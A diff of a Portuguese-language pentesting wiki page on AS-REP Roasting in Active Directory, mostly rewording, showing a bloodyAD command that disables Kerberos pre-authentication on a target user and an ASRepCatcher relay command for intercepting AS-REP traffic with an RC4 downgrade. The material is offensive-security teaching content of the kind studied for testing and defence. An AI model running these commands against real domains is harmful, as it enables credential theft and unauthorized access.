@@ -10,7 +10,7 @@ Os principais requisitos para este ataque são:
 
 - **Falta de pré-autenticação Kerberos**: Os usuários-alvo não devem ter esse recurso de segurança habilitado.
 - **Conexão ao Controlador de Domínio (DC)**: Os atacantes precisam de acesso ao DC para enviar solicitações e receber mensagens criptografadas.
-- **Conta de domínio opcional**: Ter uma conta de domínio permite que os atacantes identifiquem usuários vulneráveis de forma mais eficiente por meio de consultas LDAP. Sem tal conta, os atacantes devem adivinhar nomes de usuário.
+- **Conta de domínio opcional**: Ter uma conta de domínio permite que os atacantes identifiquem usuários vulneráveis de forma mais eficiente por meio de consultas LDAP. Sem essa conta, os atacantes devem adivinhar nomes de usuário.
 
 #### Enumerando usuários vulneráveis (necessita de credenciais de domínio)
 ```bash:Using Windows
@@ -48,12 +48,12 @@ Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbos
 ```
 
 ```bash:Using Linux
-bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
+bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
 ```
 ## ASREProast sem credenciais
 
-Um atacante pode usar uma posição de man-in-the-middle para capturar pacotes AS-REP enquanto eles atravessam a rede, sem depender da desativação da pré-autenticação Kerberos. Portanto, funciona para todos os usuários na VLAN.\
-[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) nos permite fazer isso. Além disso, a ferramenta força as estações de trabalho dos clientes a usar RC4, alterando a negociação Kerberos.
+Um atacante pode usar uma posição de man-in-the-middle para capturar pacotes AS-REP enquanto eles atravessam a rede, sem depender da desativação da pré-autenticação do Kerberos. Portanto, funciona para todos os usuários na VLAN.\
+[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) nos permite fazer isso. Além disso, a ferramenta força as estações de trabalho dos clientes a usarem RC4 ao alterar a negociação do Kerberos.
 ```bash
 # Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
 ASRepCatcher relay -dc $DC_IP
